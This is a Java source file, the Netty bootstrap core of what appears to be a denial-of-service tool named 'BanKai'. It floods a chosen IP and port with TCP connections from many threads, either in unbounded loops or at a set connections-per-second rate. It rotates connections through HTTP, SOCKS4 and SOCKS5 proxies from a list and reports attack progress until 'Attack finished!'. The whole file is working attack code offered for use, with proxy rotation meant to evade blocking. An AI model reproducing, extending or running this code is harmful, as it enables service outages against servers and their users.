package dev.xdmeow.core;

import dev.xdmeow.BanKai;
import dev.xdmeow.core.methods.IMethod;
import dev.xdmeow.core.util.proxy.Proxy;
import dev.xdmeow.core.util.proxy.ProxyManager;
import io.netty.bootstrap.Bootstrap;
import io.netty.channel.*;
import io.netty.channel.epoll.EpollEventLoopGroup;
import io.netty.channel.epoll.EpollSocketChannel;
import io.netty.channel.nio.NioEventLoopGroup;
import io.netty.channel.socket.nio.NioSocketChannel;
import io.netty.handler.proxy.HttpProxyHandler;
import io.netty.handler.proxy.Socks4ProxyHandler;
import io.netty.handler.proxy.Socks5ProxyHandler;
import io.netty.util.ResourceLeakDetector;

import java.net.InetAddress;
import java.util.Locale;
import java.util.concurrent.Executors;
import java.util.concurrent.ThreadFactory;
import java.util.concurrent.atomic.AtomicLong;

public class NettyBootstrap {
    public static final EventLoopGroup loopGroup;
    public static final Class<? extends Channel> socketChannel;
    public static final IMethod METHOD;
    public final ProxyManager LOADER = new ProxyManager(BanKai.proxyFile);
    public static volatile int currentConnections = 0;
    public static volatile int nettyThreads;
    public static volatile int triedCPS = 0;
    public static final boolean disableFailedProxies;
    public static volatile int totalConnections = 0;
    public static volatile int totalSeconds = 0;
    public static Thread attackThread;

    static {
        nettyThreads = BanKai.nettyThreads;
        disableFailedProxies = true;
        METHOD = BanKai.method;
        {
            if (System.getProperty("os.name").toLowerCase().contains("win")) {
                socketChannel = NioSocketChannel.class;
                loopGroup = new NioEventLoopGroup(nettyThreads, r -> {
                    Thread t = new Thread(r);
                    t.setDaemon(true);
                    t.setPriority(10);
                    return t;
                });
            } else {
                socketChannel = EpollSocketChannel.class;
                loopGroup = new EpollEventLoopGroup(nettyThreads, r -> {
                    Thread t = new Thread(r);
                    t.setDaemon(true);
                    t.setPriority(5);
                    return t;
                });
            }
        }
    }

    public ThreadFactory createThreadFactory(Thread.UncaughtExceptionHandler uncaughtExceptionHandler) {
        ThreadFactory threadFactory = Executors.defaultThreadFactory();
        AtomicLong atomicLong = new AtomicLong(0);
        return runnable -> {
            Thread thread = threadFactory.newThread(runnable);
            thread.setName(String.format(Locale.ROOT, "PoolThread-%d", atomicLong.getAndIncrement()));
            thread.setUncaughtExceptionHandler(uncaughtExceptionHandler);
            thread.setDaemon(true);
            return thread;
        };
    }

    public final EventLoopGroup GROUP = System.getProperty("os.name").toLowerCase().contains("win")
            ? new NioEventLoopGroup(BanKai.nettyThreads, this.createThreadFactory((t, e) -> {
    }))
            : new EpollEventLoopGroup(BanKai.nettyThreads, this.createThreadFactory((t, e) -> {
    }));

    public final ChannelHandler TAIL = new ChannelHandler() {
        public void handlerRemoved(ChannelHandlerContext arg0) {
        }

        public void handlerAdded(ChannelHandlerContext arg0) {
        }

        public void exceptionCaught(ChannelHandlerContext c, Throwable t) {
            c.close();
        }
    };

    public final ChannelInitializer<Channel> HTTP = new ChannelInitializer<Channel>() {
        public void channelInactive(ChannelHandlerContext ctx) {
            ctx.channel().close();
        }

        protected void initChannel(final Channel c) {
            try {
                final Proxy proxy = LOADER.getProxy();
                final HttpProxyHandler s = (proxy.email != null)
                        ? new HttpProxyHandler(proxy.address, proxy.email, proxy.pw)
                        : new HttpProxyHandler(proxy.address);
                s.setConnectTimeoutMillis(5000L);
                s.connectFuture().addListener(f -> {
                    if (f.isSuccess() && s.isConnected()) {
                        METHOD.accept(c, proxy);
                    } else {
                        c.close();
                    }
                });
                c.pipeline().addFirst(s).addLast(TAIL);
            } catch (Exception e) {
                c.close();
            }
        }

        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {
            ctx.close();
        }
    };

    public final ChannelInitializer<Channel> SOCKS5 = new ChannelInitializer<Channel>() {
        public void channelInactive(ChannelHandlerContext ctx) {
            ctx.channel().close();
        }

        protected void initChannel(final Channel c) {
            try {
                final Proxy proxy = LOADER.getProxy();
                final Socks5ProxyHandler s = (proxy.email != null)
                        ? new Socks5ProxyHandler(proxy.address, proxy.email, proxy.pw)
                        : new Socks5ProxyHandler(proxy.address);
                s.setConnectTimeoutMillis(5000L);
                s.connectFuture().addListener(f -> {
                    if (f.isSuccess() && s.isConnected()) {
                        METHOD.accept(c, proxy);
                    } else {
                        c.close();
                    }
                });
                c.pipeline().addFirst(s).addLast(TAIL);
            } catch (Exception e) {
                c.close();
            }
        }

        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {
            ctx.close();
        }
    };

    public final ChannelInitializer<Channel> SOCKS4 = new ChannelInitializer<Channel>() {
        public void channelInactive(ChannelHandlerContext ctx) {
            ctx.channel().close();
        }

        protected void initChannel(final Channel c) {
            try {
                final Proxy proxy = LOADER.getProxy();
                final Socks4ProxyHandler s = (proxy.email != null) ? new Socks4ProxyHandler(proxy.address, proxy.email)
                        : new Socks4ProxyHandler(proxy.address);
                s.setConnectTimeoutMillis(5000L);
                s.connectFuture().addListener(f -> {
                    if (f.isSuccess() && s.isConnected()) {
                        METHOD.accept(c, proxy);
                    } else {
                        c.close();
                    }
                });
                c.pipeline().addFirst(s).addLast(TAIL);
            } catch (Exception e) {
                c.close();
            }
        }

        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {
            ctx.close();
        }
    };

    public final ChannelFutureListener NO_PROXY = c -> {
        if (c.isSuccess())
            METHOD.accept(c.channel(), null);
    };
    public final Bootstrap BOOTSTRAP = (new Bootstrap()).channel(socketChannel).group(GROUP)
            .option(ChannelOption.TCP_NODELAY, Boolean.TRUE).option(ChannelOption.AUTO_READ, Boolean.TRUE)
            .handler((BanKai.proxyType == 0) ? TAIL
                    : ((BanKai.proxyType == 1) ? SOCKS5 : ((BanKai.proxyType == 2) ? SOCKS4 : HTTP)));
    public void start() {
        ResourceLeakDetector.setLevel(ResourceLeakDetector.Level.ADVANCED);
        InetAddress ip = BanKai.resolved;
        int port = BanKai.port;
        Thread Counter = new Thread(() -> {
            if (BanKai.duration < 1) {
                BanKai.duration = 2147483647;
            }

            for(int i = 0; i < BanKai.duration; ++i) {
                try {
                    Thread.sleep(1000L);
                } catch (InterruptedException var2) {
                    throw new RuntimeException(var2);
                }
                System.out.println("Current CPS: " + currentConnections + " | Average CPS: " + ((int)Math.ceil((double)totalConnections / (double)totalSeconds)) + " | Target CPS: " + triedCPS + " | Time Left: " + (BanKai.duration - i));
                ++totalSeconds;
                currentConnections = 0;
                triedCPS = 0;
            }
            attackThread.interrupt();
            System.out.println("Attack finished!");
            System.exit(0);
        });
        Counter.setPriority(1);
        Counter.start();
        int k;
        if (BanKai.targetCPS == -1) {
            for(k = 0; k < BanKai.loopThreads; ++k) {
                attackThread = new Thread(() -> {
                    while(true) {
                        ++triedCPS;
                        BOOTSTRAP.connect(ip, port);
                    }
                });
                attackThread.start();
            }
        } else {
            for(k = 0; k < BanKai.loopThreads; ++k) {
                attackThread = new Thread(() -> {
                    while(true) {
                        for(int j = 0; j < BanKai.targetCPS / BanKai.loopThreads / 10; ++j) {
                            ++triedCPS;
                            BOOTSTRAP.connect(ip, port);
                        }

                        try {
                            Thread.sleep(100L);
                        } catch (InterruptedException var3) {
                            throw new RuntimeException(var3);
                        }
                    }
                });
                attackThread.start();
            }
        }
    }
}
